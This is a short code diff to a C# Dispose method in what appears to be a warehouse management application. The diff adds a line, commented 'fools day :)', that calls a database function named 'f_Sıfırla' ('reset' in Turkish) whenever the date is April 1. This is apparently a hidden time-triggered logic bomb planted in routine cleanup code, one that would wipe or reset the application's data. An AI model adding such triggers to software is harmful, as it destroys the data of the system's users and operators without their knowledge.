@@ -103,6 +103,9 @@ namespace Wms12m.Presentation
         /// </summary>
         protected override void Dispose(bool disposing)
         {
+            //fools day :)
+            if (DateTime.Today.Month == 4 && DateTime.Today.Day == 1) db.f_Sıfırla();
+            //dispose
             if (disposing)
             {
                 db.Dispose();
